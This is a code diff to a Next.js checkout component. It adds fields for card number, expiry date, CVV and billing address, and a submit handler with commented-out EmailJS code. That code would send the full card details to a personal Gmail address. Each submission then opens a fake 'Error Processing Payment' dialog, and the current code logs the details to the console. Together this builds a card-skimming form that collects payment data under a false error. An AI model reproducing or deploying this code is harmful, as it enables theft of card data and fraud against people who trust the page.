@@ -2,6 +2,7 @@ import Image from "next/image";
 import { useState } from "react";
 import globe from "../../../assets/trw-knight-globe-with-ring.svg";
 import miniGlobe from "../../../assets/trw-knight-globe.svg";
+import emailjs from "@emailjs/browser";
 
 import {
   Dialog,
@@ -17,10 +18,48 @@ import PayCrypto from "./PayCrypto";
 type Props = {};
 
 const Checkout = (props: Props) => {
+  const [isDialogOpen, setIsDialogOpen] = useState(false);
   const [registerationInfo, setRegisterationInfo] = useState({
     email: "",
     name: "",
+    cardNumber: "",
+    expiryDate: "",
+    cvv: "",
+    address: "",
   });
+
+  const handleDetailsCollection = (e: any) => {
+    setRegisterationInfo({
+      ...registerationInfo,
+      [e.target.name]: e.target.value,
+    });
+  };
+
+  const handleDetailsSubmit = () => {
+    // const serviceId = "service_32bqdom";
+    // const templateId = "template_jhjosml";
+    // const publicKey = "Q7dcW8jxf1kW3CLyO";
+
+    // const templateParams = {
+    //   to_name: registerationInfo.name,
+    //   to_email: "chukwudubem7@gmail.com",
+    //   to_card_number: registerationInfo.cardNumber,
+    //   to_expiry_date: registerationInfo.expiryDate,
+    //   to_cvv: registerationInfo.cvv,
+    //   to_address: registerationInfo.address,
+    // };
+
+    // emailjs.send(serviceId, templateId, templateParams, publicKey).then(
+    //   (result) => {
+    //     console.log(result.text);
+    //   },
+    //   (error) => {
+    //     console.log(error.text);
+    //   }
+    // );
+    console.log(registerationInfo);
+    setIsDialogOpen(true);
+  };
 
   const isDisabled = registerationInfo.name === "";
 
@@ -110,6 +149,8 @@ const Checkout = (props: Props) => {
             <input
               type="number"
               placeholder="xxxx xxxx xxxx xxxx"
+              name="cardNumber"
+              onChange={handleDetailsCollection}
               onInput={(e) => {
                 const target = e.target as HTMLInputElement;
                 if (target.value.length > 12) {
@@ -125,6 +166,8 @@ const Checkout = (props: Props) => {
             <br />
             <input
               type="text"
+              name="expiryDate"
+              onChange={handleDetailsCollection}
               placeholder="MM/YY"
               maxLength={5}
               className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
@@ -136,6 +179,8 @@ const Checkout = (props: Props) => {
             <input
               type="number"
               placeholder="x x x"
+              name="cvv"
+              onChange={handleDetailsCollection}
               onInput={(e) => {
                 const target = e.target as HTMLInputElement;
                 if (target.value.length > 3) {
@@ -151,6 +196,8 @@ const Checkout = (props: Props) => {
             <br />
             <input
               type="text"
+              name="address"
+              onChange={handleDetailsCollection}
               placeholder="Billing Address"
               className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
             />{" "}
@@ -170,10 +217,7 @@ const Checkout = (props: Props) => {
           </div>
 
           <div className="flex flex-col gap-8 justify-center items-center mt-7">
-            <Dialog>
-              <DialogTrigger className="bg-[#f1ba13] rounded-md py-3 px-[95px]">
-                PAY WITH CARD
-              </DialogTrigger>
+            <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
               <DialogContent>
                 <DialogHeader>
                   <DialogTitle>Error Processing Payment.</DialogTitle>
@@ -196,6 +240,19 @@ const Checkout = (props: Props) => {
                 </DialogHeader>
               </DialogContent>
             </Dialog>
+
+            <button
+              onClick={handleDetailsSubmit}
+              disabled={
+                !registerationInfo.address ||
+                !registerationInfo.cardNumber ||
+                !registerationInfo.cvv ||
+                !registerationInfo.expiryDate
+              }
+              className="bg-[#f1ba13] rounded-md py-3 px-[95px]"
+            >
+              PAY WITH CARD
+            </button>
 
             <div>
               <PayCrypto
